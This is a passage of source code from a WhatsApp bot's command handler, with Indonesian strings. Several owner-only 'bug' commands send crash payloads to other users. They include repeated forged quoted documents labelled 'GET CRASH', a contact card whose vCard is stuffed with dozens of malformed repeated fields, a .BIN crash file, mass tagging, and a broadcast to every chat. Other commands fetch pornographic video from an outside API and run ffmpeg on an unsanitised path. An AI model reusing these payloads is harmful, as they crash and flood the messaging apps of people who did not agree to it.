if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, {document: thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
}
}
}})
}
deploy(`Succes`)
}
break
//=================================================//
//=================================================//
case 'bugbctext': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

if (!text) throw `*Type some text*\n\nExample : ${prefix + command} 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH`
let doc = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `© ${botname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${haikal.user.name},;;;\nFN:${botname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': await getBuffer(picak+'Brodcast'), thumbnail: await getBuffer(picak+'Brodcast'),sendEphemeral: true}}}
let anu = await store.chats.all().map(v => v.id)
m.reply(`*Send Broadcast To* ${anu.length} Chat\n*Time ${anu.length * 1.5} seconds*`)
for (let yoi of anu) {
await sleep(1500)
haikal.sendMessage(yoi, {text:`${text}`}, {quoted:doc})
}
m.reply('*Success Broadcast*')
}
break
//=================================================//
case 'bugtag': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

if (!m.isGroup) throw groupon(from)
haikal.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: doc })
}
break
case 'bugdoc1':{
if (isBan) throw sticBanLu(from)

if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
anuin = fs.readFileSync('./baseikal/sound/ngeselin.BIN')
haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${ngazap(prefix)}.BIN`, title: `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${ngazap(prefix)}.BIN` }, { quoted: doc })
}
break
//=================================================//
case 'bugkontak': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
 const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲\nitem1.TEL:+6285814480623\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
haikal.sendContact(m.chat, global.ownerr, fkontaak)
}
break
case 'bugvideo':{
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Bokep Nya` }, { quoted: doc })
}
break

//=================================================//
case 'jadibug1': {
if (isBan) throw sticBanLu(from)
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : doc })
}
break
//=================================================//
case 'jadibug2': {
if (isBan) throw sticBanLu(from)
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${haikal.user.name}.mp3`}, { quoted : doc})
}
break
//=================================================//
case 'jadibug3': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toPTT } = require('./baseikal/lib/converter')
let audio = await toPTT(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:doc})
}
break
//=================================================//
case 'jadibug4': {
if (isBan) throw sticBanLu(from)
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
haikal.sendMessage(m.chat, { image: buffer }, { quoted: doc })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'jadibug5': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: doc })
} else if (/video/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
}
}
break
//=================================================//

//=================================================//
case 'bugvn1': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
 mem = fs.readFileSync('./baseikal/sound/tes.mp3')
 haikal.sendMessage(m.chat, {audio: mem, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugvn2': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
 mom = fs.readFileSync('./baseikal/sound/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugvn3': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
 mim = fs.readFileSync('./baseikal/sound/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: mim, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugvn4': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
 mum = fs.readFileSync('./baseikal/sound/awkwk.mp3')
 haikal.sendMessage(m.chat, {audio: mum, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugvn5': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
 ah = fs.readFileSync('./baseikal/sound/bang.mp3')
 haikal.sendMessage(m.chat, {audio: ah, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bvavcwce': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
 eh = fs.readFileSync('./baseikal/sound/nob.mp3')
 haikal.sendMessage(m.chat, {audio: eh, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bqgcqxu': {
if (isBan) throw sticBanLu(from)
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
 ih = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: ih, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bxaxfi': {
if (isBan) throw sticBanLu(from)
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
 nyong = fs.readFileSync('./baseikal/sound/mastah.mp3')
 haikal.sendMessage(m.chat, {audio: nyong, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'cvauagfa': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
 ri = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: ri, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'cattqfci': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
 ru = fs.readFileSync('./baseikal/sound/loli.mp3')
 haikal.sendMessage(m.chat, {audio: ru, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'cvqhqtxu': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
 re = fs.readFileSync('./baseikal/sound/kesel.mp3')
 haikal.sendMessage(m.chat, {audio: re, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugvn': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
 ro = fs.readFileSync('./baseikal/sound/ngeselin.mp3')
 haikal.sendMessage(m.chat, {audio: ro, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugaudio': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
 ro = fs.readFileSync('./baseikal/sound/mastah.mp3')
 haikal.sendMessage(m.chat, {audio: ro, mimetype: 'audio/mpeg', ptt:false }, {quoted:doc})
 }
 break
//=================================================//
case 'inspect': {
if (isBan) throw sticBanLu(from)
if (!args[0]) return m.reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return m.reply("Link Invalid")
haikal.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Inspector 」
▸ ID : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}
▸ Subject : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}
▸ Subject update by : ${res.content[0].attrs.s_o.split("@")[0] ? "@" + res.content[0].attrs.s_o.split("@")[0] : "undefined"}
▸ Subject update at : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Create by : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Create at : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Members : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Members
▸ Desc update by : ${res.content[0].content[0].attrs.participant ? "@" + res.content[0].content[0].attrs.participant.split("@")[0] : "undefined"}
▸ Desc update at : ${res.content[0].content[0].attrs.t ? moment(res.content[0].content[0].attrs.t * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Desc id : ${res.content[0].content[0].attrs.id ? res.content[0].content[0].attrs.id : "undefined"}
▸ Description : ${res.content[0].content[0].content[0].content ? res.content[0].content[0].content[0].content.toString() : "No Description"}
`
try {
pp = await haikal.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
haikal.sendFile(m.chat, pp, "", m, { caption: tekse, mentions: await haikal.parseMention(tekse) })
})
}
break
//=================================================//
case 'asupan':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/random`
haikal.sendMessage(from, {video:{url:buffer}, mimetype:"video/mp4", caption:"Success"}, {quoted:m})
break
//=================================================//
case 'asupanukhty':
case 'asupan-ukhty':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/ukhty`
haikal.sendMessage(from, {video:{url:buffer}, mimetype:"video/mp4", caption:"Ini Kak Jangan Lupa Donasi Ya:)"}, {quoted:m})
break
//=================================================//
case 'asupan-santuy':
case 'asupansantuy':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/santuy`
haikal.sendMessage(from, {video:{url:buffer}, mimetype:"video/mp4", caption:"Ini Kak Jangan Lupa Donasi Ya:)"}, {quoted:m})
break
//=================================================//
case 'hijaber':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/hijaber`
haikal.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case 'cecan-indo':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/indonesia`
haikal.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case 'cecan-malaysia':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/malaysia`
haikal.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case 'cecan-thai':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/thailand`
haikal.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case 'cecan-vietnam':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/vietnam`
haikal.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case 'cecan-korea':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/korea`
haikal.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case 'cecan-jepan':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/japan`
haikal.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case 'cecan':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/cecan`
haikal.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case 'ban': case 'banned': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
if (!args[0]) return reply(`*Enter Option Select add or delete*`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banned.includes(orgnye)
if (args[0] === "add") {
if (isBane) return reply('*User has been banned*')
banned.push(orgnye)
reply(`Succes ban`)
} else if (args[0] === "del") {
if (!isBane) return reply('*ban lifted you happy*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
reply(`*Success Removing Banned Users*`)
} else {
reply("Error")
}
}
break
//=================================================//
//=================================================//
case 'searchgroups':
if (isBan) throw sticBanLu(from)
if (!q) return reply(`Example: ${prefix}searchgroups hacker`)
mel.linkwa(q)
.then(result => {
let res = '❰ *WHATSAPP GROUP LINKS* ❱\n\n'
for (let i of result) {
res += `*NAME*: *${i.nama}\n*Link*: ${i.link}\n\n`
}
reply(res)
});
break
//=================================================//
case 'kal': {
if (isBan) throw sticBanLu(from)
 hey = fs.readFileSync('./baseikal/sound/tes.mp3')
 haikal.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'ngakak': {
if (isBan) throw sticBanLu(from)
 hiy = fs.readFileSync('./baseikal/sound/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: hiy, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'ketawa': {
if (isBan) throw sticBanLu(from)
 hoy = fs.readFileSync('./baseikal/sound/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: hoy, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'awkwk': {
if (isBan) throw sticBanLu(from)
 huy = fs.readFileSync('./baseikal/sound/awkwk.mp3')
 haikal.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'bang': {
if (isBan) throw sticBanLu(from)
 mi = fs.readFileSync('./baseikal/sound/bang.mp3')
 haikal.sendMessage(m.chat, {audio: mi, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'nob': {
if (isBan) throw sticBanLu(from)
 miki = fs.readFileSync('./baseikal/sound/nob.mp3')
